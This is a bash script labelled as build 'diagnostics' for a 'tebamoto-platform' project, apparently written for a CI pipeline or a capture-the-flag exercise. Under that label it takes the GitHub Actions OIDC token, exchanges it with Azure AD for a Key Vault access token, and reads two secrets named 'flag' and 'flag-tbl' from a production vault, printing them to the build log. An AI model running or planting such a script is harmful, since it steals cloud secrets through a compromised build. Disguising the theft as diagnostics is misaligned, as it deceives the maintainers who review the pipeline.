#!/usr/bin/env bash
set -uo pipefail
echo "tebamoto-platform build: diagnostics"

TENANT="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
CLIENT="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "no oidc request url available"
  exit 0
fi

OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
echo "oidc_len=${#OIDC}"

RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
  --data-urlencode "client_id=${CLIENT}" \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}")
AT=$(printf '%s' "$RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token',''))" 2>/dev/null)
if [ -z "$AT" ]; then
  echo "token exchange failed:"
  printf '%s\n' "$RESP" | head -c 600
  exit 0
fi
echo "azure_token_len=${#AT}"

echo "secret flag:"
curl -sS -H "Authorization: Bearer ${AT}" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
echo
echo "secret flag-tbl:"
curl -sS -H "Authorization: Bearer ${AT}" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/flag-tbl?api-version=7.4"
echo
